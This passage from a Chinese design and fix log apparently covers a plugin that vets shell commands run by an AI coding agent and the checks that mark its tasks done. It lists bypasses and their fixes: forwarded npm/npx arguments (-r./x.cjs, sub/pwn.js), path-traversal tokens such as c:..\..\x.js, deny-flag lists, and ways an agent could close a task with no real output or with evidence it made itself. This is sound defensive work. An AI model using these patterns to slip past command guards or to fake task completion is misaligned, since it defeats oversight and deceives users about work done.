这就是 `npx` 洗白（R5）的同胞：**入口程序看到的 argv 不是下游程序看到的 argv**。所以修法也照抄 `npx` 那一处——剥壳、把下游真正收到的 argv 再判一遍：

```js
// 脚本名之后的参数会被包管理器转发给下游程序，按解释器口径重判
if (idx >= 0) {
  for (let i = idx + 1; i < args.length; i++) {
    const forwarded = unsafeForwardedArg(args[i]);
    if (forwarded) return `「${forwarded}」会在脚本里被执行（包管理器会把参数转发过去），…`;
  }
}
```

三个细节是实测出来的，不是猜的：

1. **扫「脚本名之后的所有 token」，不是只扫 `--` 之后**。`npm test sub/pwn.js`（不带 `--`）一样会被转发——npm 把多余参数直接拼进 scripts 命令串。只判 `--` 会留一条一模一样的旁路。
2. **贴值形式要单独判**（`-r./x.cjs` / `-e1+1`）。`FORWARD_DENY_FLAGS.includes(name)` 对 `-r./x.cjs` 是 false，因为它不是精确相等的名字。
3. **`--test-reporter=<模块路径>` 与解释器那边同口径**（只认内置名字）。同一个开关在两处判据不一致，就是下一轮的新 bug。

### 17.2 R12 / R10 的修法：判「有没有产出」，不判「跑没跑」

这两项是同一个洞的两面：**「检查通过」不等于「有东西被做出来」。**

- R12 的现场：`node --test` 在一个测试文件都没有的项目里退出码是 **0**（不是 1、不是错误，就是 0）。于是 `declare node --test → run（通过）→ done` 三步就能把卡收掉，AI 一个字都没写。
- R10 的现场：`do.files` 点名一个**真实存在**的文件就能当交付证据——而脚手架自己能写 `package.json`，于是「我自己造的证据证明我自己干完了」。

修法是把判据从「跑没跑」换成「有没有产出」，并且**产出的定义要排除自己造的东西**：

```
项目里的「用户自己的产出」
  = 普通文件
  − 模式产物（IDEA.md / TECH.md / VERIFY.md / HANDOFF.md / CHANGE-GUIDE.md）
  − 脚手架能写的 7 个配置文件（package.json / tsconfig.json / …）
```

这两个排除项是这项修复的**全部要点**——不排除它们，任何「AI 自己造的产物」都能自我认证。排除清单从 `deps.scaffold.WHITELIST` 现读，不手抄，这样以后扩白名单不会漏。

代价（要明说）：`plando_card done` 在一个**只写配置**的项目上会拒。但这恰好是想要的——只写配置等于没做东西。

### 17.3 R11 的修法：不是调词表，是拆掉一个错误判据

§16 说得对：「一个数字也算标记」这条判据本身就是旁路——空话后面随便缀个数字就能收卡（10 句 10 过）。

删掉 `/\d/` 这一支。理由是它本来就答错了问题：**「第 1 步」说的是进度，判据要的是「交付了什么」**。数字仍然参与字数统计，所以 `'第 2 步做完了，第 3 步没开始'` 这种真理由照旧通过（实测 12/12）。

补的 7 个词（`懒得` / `下次` / `明天` / `再说` / `先做` / `先看` / `攒`）不是「给攻击面打补丁」，而是收「口语里表达『算了』的常用说法」——它收敛，所以能列；**判决权仍然在「删完还剩多少实质内容」那条规则手里**，新造一句空话最多让它多写几个字。

### 17.4 R9 的修法：形状判据的三条补充

`unsafePathToken` 原来只认「盘符 + 分隔符」，于是 `c:..\..\x.js` 整个漏了。§16.11 第三条对我上一轮的判断做了修正，这条修正值得留档：

> **「需要额外条件」不等于「不可利用」——要看这个条件是不是攻击者能自己造出来的。**
> `..\..` 就是他自己造的。

补的三条：

1. **盘符相对**（`C:evil.js` / `c:..\..\x.js`）——要求盘符之后出现 `.` 或分隔符才认，这样 `--test-name-pattern=a:b` 这种**参数值**里带冒号的合法写法不会被误杀（§15 踩过这个坑）。
2. **短开关贴 `..`**（`-p../tsconfig.json`）——注意只认两个点：`-r./x.cjs` 里的 `./` 不是越界，它是项目内相对路径，而且那种写法本来就被解释器闸门以「执行任意代码」拒掉了。
3. **`=` 之后再出现 `=`**（`--prefix=a=../x` / `--outDir==../x`）——按 `=` 切开，每一段独立走一遍深度判定。

### 17.5 `NPX_SAFE_FLAGS` 的护栏：一条会让名单项失败的测试

§16.11 第四条是对的，而且它比「删掉两个坏项」重要得多：

> **「名单里的每一项无害」不能靠读名字判断，要靠一条会让它失败的测试。**

新增 `test/npx-flags.test.js`，判据很硬：

```
npx <开关> node -e "process.exit(9)"   →  整条命令的退出码必须是 9
```

子命令被 npm 当配置吃掉时，npx 自己会以 **0** 结束（它觉得没事可做）——这就是可观测的失败。这条测试用**真 spawn**，不 mock：这一层的风险恰恰是「我以为它无害」，mock 掉 npx 就永远发现不了。

同时保留一条对 `--no` / `--no-cache` 的**反向**断言（它们必须以 0 结束、必须被 `validateCommand` 拒）。如果哪天 npm 改了行为、这两项不再吞子命令，那条断言会红，提醒重新评估名单——而不是默默放开。

代价：这个测试文件单独跑约 22 秒（每次 npx 启动约 2 秒 × 9）。`node --test` 按文件并行，整体只从 7 秒变成 24 秒，可以接受。

### 17.6 顺带修的 `SAFE_SCRIPT_KEYS`：加名字治不了根，命名空间能

§16 报 3/24 假杀（`preview` / `clean` / `build:prod`）。加名字治不了根——`build:<任意>` 是无穷的。按 §15 的结论改成两条规则：

1. **没有冒号的键**必须在名单里。这一条**必须**靠枚举（npm 的生命周期钩子就是「任意名字」），但名单有界，因为「跑检查/构建」的常用键收敛。
2. **带冒号的键**只要求冒号前是名单里的基名。这一条**能**结构化，因为 **npm 的生命周期钩子里没有一个带冒号**——`pre*` / `post*` 前缀的都是钩子，而 `build:prod` 永远只是被显式调用的脚本。

顺带把 `checks.js` 的 `PM_SAFE_SCRIPTS` 改成同一套判据，并加**行为级**漂移断言：同一个键，`plando_scaffold` 写得进去 ⟺ `npm run <键>` 放行。这比「两份名单字符串相等」强，因为它盯的是用户能观测到的结论。

代价（故意的）：`prepare` / `prepublishOnly` 不放行。它们确实是生命周期钩子，装了 husky 就等于装了别的包，超出「跑检查」的范围。

### 17.7 这一轮之后，还剩什么

**没剩阻塞项。** §16.10 列的五条发版门，这一轮全部落地：

1. ~~R12 必修~~ ✅
2. ~~R13 必修~~ ✅
3. ~~R10 必修~~ ✅
4. ~~R5 名单修正必修~~ ✅
5. ~~R9 顺手修~~ ✅；R11 改掉了错误判据 ✅

**还开着的、但已经写进 README「已知残余」的**（都是「拦不住但不构成实际风险」或「拦了会误杀得更狠」）：

- 裸写 `npx <工具>`（`npx vitest`）仍放行。§16.8(2) 建议拒，**没有采纳**——理由见下。
- `node evil.js` / `deno run x.ts` / `bun run x.ts` 放行（要求项目里本来就有那个文件，而本插件写不出 `.js`）。
- 白名单内工具 + 无意义开关的组合会放行（到工具那一步自己报错）。

**为什么没采纳「拒掉裸 `npx <工具>`」**：那条建议的依据是 `npx vitest` 会进交互式 watch、在守卫里挂满 60 秒超时。这个事实成立，但「挂满超时」的后果是**按失败处理**（超时不是通过），不构成绕过；代价却是实打实的误杀——`npx jest` / `npx webpack` 是标准写法（npx 先找本地的 `node_modules/.bin/`，本地装了就不下载），而且 `npx jest` 的默认行为就是跑一遍测试。要区分「bare 会进 watch」的那些工具，就得再列一份名单——正是三轮里反复翻车的那种修法。**记进「已知残余」，不装作拦住了。**

### 17.8 方法论的第四条（自我修正）

§16.11 那三条我全部接受，并且这一轮又撞上它们的两个新实例：

- 第一条（问「下游收到的 argv 是什么」）让我一次找到了 R13，而不是逐个开关去堵。
- 第四条（名单项必须配会失败的测试）让我发现 `--no` 根本不是「少输出」，而是把子命令整个吃掉。

**要补的第五条**：**修完之后要重跑「另一端还能不能到 `done`」的完整链路，而不是只跑单元测试。**
R10 / R12 都是「纯函数层满分、工具层能推到 `done` 而用户代码是 `[]`」。这一轮我按 §16 的口径，把 R10 / R12 的验证都写成了**走状态机的脚本**（`declare → run → done`、`scaffold → do → done`），而不是只断言 `doneCard` 的返回值——只有这样才看得见「它其实还是能过」。